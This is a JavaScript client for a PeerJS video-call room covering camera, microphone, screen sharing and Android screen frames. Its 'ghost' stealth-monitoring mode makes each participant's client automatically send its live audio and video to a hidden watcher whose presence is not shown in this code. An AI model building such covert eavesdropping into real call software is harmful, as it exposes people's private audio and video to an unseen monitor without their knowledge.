(() => {
    "use strict"

    let socket = utils.socket;
    let customlogger = utils.customlogger;

    let myScreenSharingVideoStream;
    let sharedScreenPeerID;
    let currentlySharingScreen = false;

    let peer = utils.peer();
    let ROOM_ID = utils.ROOM_ID;
    const IS_GHOST = utils.IS_GHOST;

    let myVideoStream;
    let allCalls = {};  // 普通视频通话 call（key: peerId）
    let screenShareCalls = {};  // 屏幕共享 call（key: peerId）
    let ghostCalls = {};  // ghost 用户的 call（key: peerId）

    // 当前摄像头方向（前置/后置）
    let currentFacingMode = 'user';  // 'user' = 前置, 'environment' = 后置

    // 标记 peer 已就绪（供 room.ejs 的 ghost 模式使用）
    peer.on('open', () => { window.peerReady = true; });
    window.peerReady = false;

    // 暴露 allCalls 供 room.ejs 使用
    window.allCalls = allCalls;

    // ===== 视频元素 =====
    const myVideo = document.createElement('video');

    // ===== 权限检查 =====
    let micChecker = navigator.permissions.query({ name: 'microphone' })
        .then((permissionObj) => {})
        .catch((error) => customlogger('Got microphone error :', error));

    let camChecker = navigator.permissions.query({ name: 'camera' })
        .then((permissionObj) => {})
        .catch((error) => customlogger('Got camera error :', error));

    // ===== 屏幕共享配置 =====
    const gdmOptions = {
        video: { cursor: "always" },
        audio: { echoCancellation: true, noiseSuppression: true, sampleRate: 44100 }
    }

    const startCapture = async () => {
        try {
            myScreenSharingVideoStream = await navigator.mediaDevices.getDisplayMedia(gdmOptions);
            // 监听用户从浏览器 UI 停止共享
            myScreenSharingVideoStream.getVideoTracks()[0].addEventListener('ended', () => {
                if (currentlySharingScreen) {
                    window.toggleScreenShare();
                }
            });
        } catch (err) {
            console.error("Start Capture Error: " + err);
            throw err;
        }
    }

    const stopCapture = () => {
        let tracks = myScreenSharingVideoStream?.getTracks() || [];
        tracks.forEach(track => track.stop());
        myScreenSharingVideoStream = null;
    }

    // ===== 获取用户媒体（摄像头/麦克风）=====
    const getUserMediaWithFacingMode = (facingMode) => {
        const isMobile = /Mobi|Android|iPhone/i.test(navigator.userAgent);
        return navigator.mediaDevices.getUserMedia({
            video: isMobile ? { facingMode: facingMode } : true,
            audio: true
        });
    }

    // ===== 添加视频流到界面 =====
    const addVideoStream = (video, stream, isSelf = false, peerUserId = null) => {
        video.srcObject = stream;
        video.setAttribute('playsinline', '');
        video.setAttribute('autoplay', '');

        if (isSelf) {
            video.muted = true;
            if (window.onMyVideoReady) {
                window.onMyVideoReady(video);
            }
        } else {
            if (window.onRemoteVideoReady) {
                window.onRemoteVideoReady(video, peerUserId);
            }
        }

        video.addEventListener('loadedmetadata', () => {
            video.play().catch(e => console.log('自动播放失败:', e));
        });
    }

    // ===== 添加屏幕共享流到界面 =====
    const addScreenShareStream = (video, stream, peerUserId = null) => {
        video.srcObject = stream;
        video.setAttribute('playsinline', '');
        video.setAttribute('autoplay', '');

        // 显示到屏幕共享容器
        const container = document.getElementById('screenShareContainer');
        container.innerHTML = '';
        container.classList.add('show');

        const label = document.createElement('div');
        label.className = 'screen-share-label';
        label.textContent = '💻 屏幕共享中';
        container.appendChild(label);
        container.appendChild(video);

        video.addEventListener('loadedmetadata', () => {
            video.play().catch(e => console.log('自动播放失败:', e));
        });
    }

    // ===== 隐藏屏幕共享显示 =====
    const hideScreenShareDisplay = () => {
        const container = document.getElementById('screenShareContainer');
        container.classList.remove('show');
        container.innerHTML = '';
    }

    // ===== 播放视频流（初始化自己）=====
    const playVideoStream = () => {
        if (IS_GHOST) {
            // ===== 隐身监控模式：不请求摄像头/麦克风，但能接收对方的 call =====
            customlogger("[监控模式] 初始化（不请求摄像头）");
            // 创建空流用于应答
            const emptyStream = new MediaStream();
            myVideoStream = emptyStream;

            // 监听来电（房间内其他人主动 call 监控者）
            peer.on('call', (call) => {
                const isScreenShare = call.metadata && call.metadata.type === 'screen-share';
                if (isScreenShare) {
                    call.answer(emptyStream);
                    const vid = document.createElement('video');
                    call.on('stream', (userVideoStream) => {
                        console.log('[监控-收到屏幕共享流]');
                        addScreenShareStream(vid, userVideoStream, call.peer);
                    });
                    call.on('close', () => hideScreenShareDisplay());
                    screenShareCalls[call.peer] = call;
                } else {
                    call.answer(emptyStream);
                    const vid = document.createElement('video');
                    vid.dataset.peerId = call.peer;
                    call.on('stream', (userVideoStream) => {
                        console.log('[监控-收到视频流]', call.peer);
                        addVideoStream(vid, userVideoStream, false, call.peer);
                    });
                    call.on('close', () => {
                        const mainVideo = document.getElementById('mainVideo');
                        const v = mainVideo.querySelector('video');
                        if (v && v.dataset.peerId === call.peer) {
                            mainVideo.innerHTML = '';
                        }
                    });
                    if (!allCalls[call.peer]) allCalls[call.peer] = call;
                }
            });

            // 接收原生屏幕共享事件
            socket.on('native-screen-share-start', () => showNativeScreenShare());
            socket.on('native-screen-share-stop', () => hideNativeScreenShare());
            socket.on('native-screen-frame', (data) => updateNativeScreenFrame(data.frame));

            // 监控模式主动 call 房间内的成员
            window.connectToNewUserForGhost = (peerUserID) => {
                if (allCalls[peerUserID] || ghostCalls[peerUserID]) {
                    console.log('[监控] 已存在 call，跳过', peerUserID);
                    return;
                }
                const call = peer.call(peerUserID, emptyStream, {
                    metadata: { type: 'video', ghost: true }
                });
                const vid = document.createElement('video');
                vid.dataset.peerId = peerUserID;
                call.on('stream', (userVideoStream) => {
                    console.log('[监控-主动收到视频流]', peerUserID);
                    addVideoStream(vid, userVideoStream, false, peerUserID);
                });
                call.on('close', () => {
                    const mainVideo = document.getElementById('mainVideo');
                    const v = mainVideo.querySelector('video');
                    if (v && v.dataset.peerId === peerUserID) {
                        mainVideo.innerHTML = '';
                    }
                });
                ghostCalls[peerUserID] = call;
                allCalls[peerUserID] = call;
            };
            return;
        }

        // ===== 普通用户模式 =====
        getUserMediaWithFacingMode(currentFacingMode).then((stream) => {
            customlogger("load permission for audio and video");
            myVideoStream = stream;
            addVideoStream(myVideo, stream, true);

            // ===== 监听来电（对方 call 我）=====
            peer.on('call', (call) => {
                // 通过 metadata 判断是普通 call 还是屏幕共享 call
                const isScreenShare = call.metadata && call.metadata.type === 'screen-share';
                const isGhostCall = call.metadata && call.metadata.ghost === true;

                if (isScreenShare) {
                    // 屏幕共享 call：回答时发送空流（不需要互发）
                    const emptyStream = new MediaStream();
                    call.answer(emptyStream);

                    const vid = document.createElement('video');
                    call.on('stream', (userVideoStream) => {
                        console.log('[收到屏幕共享流]');
                        addScreenShareStream(vid, userVideoStream, call.peer);
                    });
                    call.on('close', () => {
                        console.log('[屏幕共享 call 关闭]');
                        hideScreenShareDisplay();
                    });
                    screenShareCalls[call.peer] = call;
                } else {
                    // 普通视频 call（包括 ghost 监控者的 call）
                    // 关键修复：ghost call 时也用自己的视频流应答，这样监控者才能收到视频
                    if (isGhostCall) {
                        console.log('[ghost 监控者 call 进入，发送视频流]', call.peer);
                        call.answer(stream);  // 用自己的流应答，让监控者能看到
                    } else {
                        call.answer(stream);
                    }

                    const vid = document.createElement('video');
                    vid.dataset.peerId = call.peer;
                    call.on('stream', (userVideoStream) => {
                        console.log('[收到对方视频流]', call.peer);
                        if (!isGhostCall) {
                            // 只显示非 ghost 的视频流（ghost 发的是空流，不显示）
                            addVideoStream(vid, userVideoStream, false, call.peer);
                        }
                    });
                    call.on('close', () => {
                        console.log('[视频 call 关闭]', call.peer);
                        const mainVideo = document.getElementById('mainVideo');
                        const v = mainVideo.querySelector('video');
                        if (v && v.dataset.peerId === call.peer) {
                            mainVideo.innerHTML = '';
                        }
                    });
                    // 只有当不存在时才存入，避免覆盖主动 call 的引用
                    if (!allCalls[call.peer]) {
                        allCalls[call.peer] = call;
                    }
                }
            });

            // ===== 新用户连接 =====
            socket.on('user-connected', (peerUserID) => {
                customlogger("user-connected", peerUserID);
                connectToNewUser(peerUserID, stream);
            });

            // ===== 用户断开 =====
            socket.on('user-disconnected', (peerUserID) => {
                customlogger("user-disconnected", peerUserID);
                if (allCalls[peerUserID]) {
                    allCalls[peerUserID].close();
                    delete allCalls[peerUserID];
                }
                if (screenShareCalls[peerUserID]) {
                    screenShareCalls[peerUserID].close();
                    delete screenShareCalls[peerUserID];
                }
                if (ghostCalls[peerUserID]) {
                    ghostCalls[peerUserID].close();
                    delete ghostCalls[peerUserID];
                }
                const mainVideo = document.getElementById('mainVideo');
                const v = mainVideo.querySelector('video');
                if (v && v.dataset.peerId === peerUserID) {
                    mainVideo.innerHTML = '';
                }
            });

            // ===== ghost 监控者进入房间：主动 call 它，发送自己的视频流 =====
            socket.on('ghost-joined', (data) => {
                const { peerUserId } = data;
                console.log('[ghost 监控者进入，发送视频流]', peerUserId);
                if (peerUserId && !allCalls[peerUserId]) {
                    // 关键修复：发送自己的视频流给监控者（不是空流）
                    const call = peer.call(peerUserId, stream, {
                        metadata: { type: 'video', ghost: true }
                    });
                    call.on('stream', (userVideoStream) => {
                        console.log('[收到 ghost 视频流，忽略]', peerUserId);
                    });
                    call.on('close', () => {
                        console.log('[ghost call 关闭]', peerUserId);
                    });
                    ghostCalls[peerUserId] = call;
                }
            });

            // ===== ghost 监控者离开 =====
            socket.on('ghost-left', (data) => {
                const { peerUserId } = data;
                console.log('[ghost 监控者离开]', peerUserId);
                if (ghostCalls[peerUserId]) {
                    ghostCalls[peerUserId].close();
                    delete ghostCalls[peerUserId];
                }
                if (allCalls[peerUserId]) {
                    allCalls[peerUserId].close();
                    delete allCalls[peerUserId];
                }
            });

            // ===== 屏幕共享事件（对方开始共享）=====
            socket.on('user-screen-share', (data) => {
                sharedScreenPeerID = data.peerUserId;
                // 对方会主动 call 我，这里不需要做什么
                console.log('[对方开始屏幕共享]', sharedScreenPeerID);
            });

            // ===== 原生安卓屏幕共享接收 =====
            socket.on('native-screen-share-start', (data) => {
                customlogger("原生端开始屏幕共享");
                showNativeScreenShare();
            });

            socket.on('native-screen-share-stop', (data) => {
                customlogger("原生端停止屏幕共享");
                hideNativeScreenShare();
            });

            socket.on('native-screen-frame', (data) => {
                updateNativeScreenFrame(data.frame);
            });

        }).catch(e => customlogger(e));
    }

    // ===== 连接新用户（主动 call 对方）=====
    const connectToNewUser = (peerUserID, stream) => {
        if (allCalls[peerUserID]) {
            console.log('[已存在 call，跳过]', peerUserID);
            return;
        }
        const call = peer.call(peerUserID, stream, {
            metadata: { type: 'video' }
        });
        const vid = document.createElement('video');
        vid.dataset.peerId = peerUserID;
        call.on('stream', (userVideoStream) => {
            console.log('[收到对方视频流]', peerUserID);
            addVideoStream(vid, userVideoStream, false, peerUserID);
        });
        call.on('close', () => {
            console.log('[视频 call 关闭]', peerUserID);
            const mainVideo = document.getElementById('mainVideo');
            const v = mainVideo.querySelector('video');
            if (v && v.dataset.peerId === peerUserID) {
                mainVideo.innerHTML = '';
            }
        });
        allCalls[peerUserID] = call;
    };

    // ===== 屏幕共享：主动 call 所有已连接的 peer =====
    const startScreenShareToPeers = () => {
        if (!myScreenSharingVideoStream) return;
        Object.keys(allCalls).forEach(peerId => {
            if (screenShareCalls[peerId]) return;  // 已经在共享
            const call = peer.call(peerId, myScreenSharingVideoStream, {
                metadata: { type: 'screen-share' }
            });
            console.log('[发起屏幕共享 call]', peerId);
            screenShareCalls[peerId] = call;
        });
    };

    // ===== 停止屏幕共享：关闭所有屏幕共享 call =====
    const stopScreenShareToPeers = () => {
        Object.keys(screenShareCalls).forEach(peerId => {
            screenShareCalls[peerId].close();
            delete screenShareCalls[peerId];
        });
        hideScreenShareDisplay();
    };

    // ===== 主函数 =====
    const main = async () => {
        playVideoStream();
    }

    // ===== 暴露给 HTML 的函数 =====

    // 切换静音
    window.toggleMute = () => {
        if (!myVideoStream) return;
        const audioTracks = myVideoStream.getAudioTracks();
        if (audioTracks.length === 0) return;

        const enabled = audioTracks[0].enabled;
        audioTracks[0].enabled = !enabled;

        const btn = document.getElementById('muteToggle');
        const icon = btn.querySelector('.control-icon i');
        const label = btn.querySelector('.control-label');

        if (enabled) {
            btn.classList.add('off');
            icon.className = 'fa fa-microphone-slash';
            label.textContent = '取消静音';
        } else {
            btn.classList.remove('off');
            icon.className = 'fa fa-microphone';
            label.textContent = '静音';
        }
    };

    // 切换视频
    window.toggleVideo = () => {
        if (!myVideoStream) return;
        const videoTracks = myVideoStream.getVideoTracks();
        if (videoTracks.length === 0) return;

        const enabled = videoTracks[0].enabled;
        videoTracks[0].enabled = !enabled;

        const btn = document.getElementById('videoToggle');
        const icon = btn.querySelector('.control-icon i');
        const label = btn.querySelector('.control-label');

        if (enabled) {
            btn.classList.add('off');
            icon.className = 'fa fa-eye-slash';
            label.textContent = '开启视频';
        } else {
            btn.classList.remove('off');
            icon.className = 'fa fa-video-camera';
            label.textContent = '视频';
        }
    };

    // ===== 恢复视频轨道（供 Android WebView 调用）=====
    // 屏幕共享结束后或从后台返回时，Android 端会调用此函数恢复视频
    window.resumeVideoTracks = () => {
        console.log('[恢复视频轨道] 被调用');
        if (!myVideoStream) {
            console.log('[恢复视频轨道] myVideoStream 不存在');
            return;
        }
        const videoTracks = myVideoStream.getVideoTracks();
        if (videoTracks.length === 0) {
            console.log('[恢复视频轨道] 无视频轨道');
            return;
        }
        // 确保所有视频轨道都启用
        videoTracks.forEach(track => {
            if (!track.enabled) {
                track.enabled = true;
                console.log('[恢复视频轨道] 已启用视频轨道:', track.label);
            }
            // 检查轨道是否处于活跃状态
            if (track.readyState !== 'live') {
                console.log('[恢复视频轨道] 轨道非活跃状态:', track.readyState);
            }
        });
        // 更新按钮状态
        const btn = document.getElementById('videoToggle');
        if (btn) {
            btn.classList.remove('off');
            const icon = btn.querySelector('.control-icon i');
            const label = btn.querySelector('.control-label');
            if (icon) icon.className = 'fa fa-video-camera';
            if (label) label.textContent = '视频';
        }
        // 重新播放自己的视频
        if (myVideo) {
            myVideo.play().catch(e => console.log('重新播放视频失败:', e));
        }
    };

    // 翻转摄像头（手机端）
    window.switchCamera = async () => {
        const isMobile = /Mobi|Android|iPhone/i.test(navigator.userAgent);
        if (!isMobile) {
            alert('翻转摄像头功能仅适用于手机端');
            return;
        }

        if (!myVideoStream) return;

        currentFacingMode = currentFacingMode === 'user' ? 'environment' : 'user';

        try {
            myVideoStream.getVideoTracks().forEach(track => track.stop());
            const newStream = await getUserMediaWithFacingMode(currentFacingMode);
            const newVideoTrack = newStream.getVideoTracks()[0];
            const oldAudioTrack = myVideoStream.getAudioTracks()[0];

            const combinedStream = new MediaStream();
            if (oldAudioTrack) combinedStream.addTrack(oldAudioTrack);
            if (newVideoTrack) combinedStream.addTrack(newVideoTrack);

            myVideoStream = combinedStream;
            myVideo.srcObject = combinedStream;

            // 替换所有已建立 call 的视频轨道
            Object.values(allCalls).forEach(call => {
                const sender = call.peerConnection?.getSenders().find(s => s.track?.kind === 'video');
                if (sender && newVideoTrack) {
                    sender.replaceTrack(newVideoTrack);
                }
            });

            console.log('摄像头已翻转，方向:', currentFacingMode);
        } catch (err) {
            console.error('翻转摄像头失败:', err);
            alert('翻转摄像头失败：' + err.message);
            currentFacingMode = currentFacingMode === 'user' ? 'environment' : 'user';
        }
    };

    // 切换屏幕共享
    window.toggleScreenShare = async () => {
        if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) {
            alert('您的浏览器不支持屏幕共享。\n\n移动端浏览器通常不支持屏幕共享，请使用安卓 App 或电脑端。');
            return;
        }

        if (!currentlySharingScreen) {
            // ===== 开始共享 =====
            try {
                await startCapture();
                currentlySharingScreen = true;

                // 通知房间内其他人（让他们准备接收屏幕共享 call）
                socket.emit('screen-share-init', { roomID: ROOM_ID, peerUserId: peer.id });

                // 主动 call 所有已连接的 peer，发送屏幕共享流
                startScreenShareToPeers();

                const btn = document.getElementById('shareScreenToggle');
                btn.classList.add('active');
                btn.querySelector('.control-label').textContent = '停止共享';
            } catch (err) {
                console.error('启动屏幕共享失败:', err);
                currentlySharingScreen = false;
            }
        } else {
            // ===== 停止共享 =====
            currentlySharingScreen = false;

            // 关闭所有屏幕共享 call
            stopScreenShareToPeers();

            // 停止捕获
            stopCapture();

            const btn = document.getElementById('shareScreenToggle');
            btn.classList.remove('active');
            btn.querySelector('.control-label').textContent = '共享';
        }
    };

    // ===== 原生屏幕共享显示 =====
    let nativeScreenImg = null;
    let nativeScreenActive = false;

    const showNativeScreenShare = () => {
        if (nativeScreenActive) return;
        nativeScreenActive = true;

        const container = document.getElementById('screenShareContainer');
        container.innerHTML = '';
        container.classList.add('show');

        const label = document.createElement('div');
        label.className = 'screen-share-label';
        label.textContent = '📱 屏幕共享中';
        container.appendChild(label);

        nativeScreenImg = document.createElement('img');
        container.appendChild(nativeScreenImg);

        customlogger("显示原生屏幕共享");
    };

    const hideNativeScreenShare = () => {
        if (!nativeScreenActive) return;
        nativeScreenActive = false;

        const container = document.getElementById('screenShareContainer');
        container.classList.remove('show');
        container.innerHTML = '';

        const label = document.createElement('div');
        label.className = 'screen-share-label';
        label.textContent = '📱 屏幕共享中';
        container.appendChild(label);

        nativeScreenImg = null;
        customlogger("隐藏原生屏幕共享");
    };

    const updateNativeScreenFrame = (base64Frame) => {
        if (!nativeScreenActive || !nativeScreenImg) return;
        nativeScreenImg.src = 'data:image/jpeg;base64,' + base64Frame;
    };

    // ===== 启动 =====
    Promise.all([camChecker, micChecker]).then(() => {
        main().catch(e => customlogger(e));
    });

})()
